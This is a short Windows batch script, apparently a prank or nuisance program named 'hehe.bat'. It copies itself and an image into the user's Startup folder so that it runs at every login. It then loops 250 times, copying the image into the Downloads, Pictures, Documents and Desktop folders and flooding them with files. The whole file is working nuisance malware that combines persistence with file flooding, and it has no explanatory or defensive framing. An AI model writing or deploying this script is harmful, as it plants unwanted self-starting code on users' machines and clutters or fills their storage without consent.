@echo off
Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\

FOR /L %%A IN (1,1,250) DO (
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%time%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%time%".jpg*
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%time%".jpg*	
	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%time%".jpg*
)


